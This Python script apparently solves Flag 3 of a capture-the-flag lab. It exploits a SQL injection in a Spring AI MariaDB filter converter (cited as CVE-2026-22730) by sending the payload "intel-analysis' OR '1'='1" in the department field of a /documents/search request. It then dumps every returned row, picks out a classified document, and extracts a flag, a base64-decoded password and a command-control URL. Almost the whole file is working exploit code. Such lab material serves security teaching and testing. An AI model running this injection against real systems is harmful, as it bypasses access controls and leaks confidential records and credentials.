#!/usr/bin/env python3
"""Flag 3 — CVE-2026-22730 (Spring AI MariaDB SQL injection).

The archive-service builds the WHERE clause for /documents/search by feeding
the user-controlled `department` value through Spring AI's
MariaDBFilterExpressionConverter, which wraps strings in single quotes
without escaping. Closing the literal early lets us return rows we shouldn't
see — including the mato-special-ops document that holds Flag 3 and the
credentials for command-control.
"""

from __future__ import annotations

import base64
import json
import os
import re
import sys

import requests

from common import (
    DEFAULT_GATEWAY,
    banner,
    basic_auth_header,
    detail,
    die,
    dump,
    find_flag,
    section,
)
import solve_flag2


PRESIDENT_PASSWORD_RE = re.compile(r"base64:\s*([A-Za-z0-9+/=]+)")
COMMAND_URL_RE = re.compile(r"Command-control is reachable at\s+(\S+)\s*\.")


def run(gateway: str,
        username: str | None = None,
        password: str | None = None) -> tuple[str, str, str]:
    section("flag3", "STEP 1 — obtain credentials for /documents/search")
    if username is None or password is None:
        banner("flag3", "no credentials supplied — running Flag 2 first")
        _, username, password = solve_flag2.run(gateway)
    else:
        detail("flag3", "creds supplied", f"{username}:{'*' * len(password)}")
        banner("flag3", "  ✓ reusing credentials from caller")

    section("flag3", "STEP 2 — craft & send SQL injection payload")
    detail("flag3", "CVE", "CVE-2026-22730 (Spring AI MariaDBFilterExpressionConverter)")
    detail("flag3", "vulnerable param", "department")
    detail("flag3", "root cause", "values wrapped in single quotes WITHOUT escaping")

    payload = {"query": "anything", "department": "intel-analysis' OR '1'='1"}
    url = f"{gateway}/documents/search"
    detail("flag3", "POST URL", url)
    detail("flag3", "payload", json.dumps(payload))
    detail(
        "flag3",
        "resulting WHERE clause (approx)",
        "department = 'intel-analysis' OR '1'='1' → matches every row",
    )

    r = requests.post(
        url,
        headers={**basic_auth_header(username, password),
                 "Content-Type": "application/json"},
        data=json.dumps(payload),
        timeout=10,
    )
    detail("flag3", "response status", r.status_code)
    detail("flag3", "response length", f"{len(r.text)} bytes")
    if r.status_code != 200:
        die(f"/documents/search injection failed: {r.status_code} {r.text}")

    docs = r.json()
    detail("flag3", "documents returned", len(docs))
    for d in docs:
        detail(
            "flag3",
            f"  doc[{d.get('id','?')}] meta",
            d.get("metadata") or "<none>",
        )
    dump("flag3", "full /documents/search response", docs)
    banner("flag3", "  ✓ injection bypassed department filter — extra rows leaked")

    section("flag3", "STEP 3 — locate classified mato-special-ops document")
    secret = next(
        (d for d in docs if "mato-special-ops" in (d.get("metadata") or "").lower()),
        None,
    )
    if not secret:
        die("injection didn't surface a mato-special-ops document")
    detail("flag3", "secret doc id", secret.get("id"))
    detail("flag3", "secret metadata", secret.get("metadata"))
    detail("flag3", "secret content (first 200B)", secret["content"][:200])
    dump("flag3", "full secret document", secret)

    flag = find_flag(secret["content"])
    if not flag:
        die("special-ops doc has no flag")

    section("flag3", "STEP 4 — extract president password + command-control URL")
    pw_match = PRESIDENT_PASSWORD_RE.search(secret["content"])
    url_match = COMMAND_URL_RE.search(secret["content"])
    if not pw_match or not url_match:
        die("classified doc was missing command-control URL or president password")

    detail("flag3", "raw base64 password", pw_match.group(1))
    decoded = base64.b64decode(pw_match.group(1)).decode()
    command_url = os.environ.get("COMMAND_URL", url_match.group(1))

    detail("flag3", "decoded president pw", f"{decoded[:20]}…  ({len(decoded)} bytes)")
    detail("flag3", "command-control URL", command_url)

    banner("flag3", f"FLAG 3 = {flag}")
    banner("flag3", "→ president password + command-control URL ready for Flag 4")
    return flag, decoded, command_url


def main() -> None:
    gateway = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_GATEWAY
    flag, pw, command_url = run(gateway)
    print()
    print(json.dumps({"flag3": flag, "president_password": pw, "command_url": command_url}, indent=2))


if __name__ == "__main__":
    main()
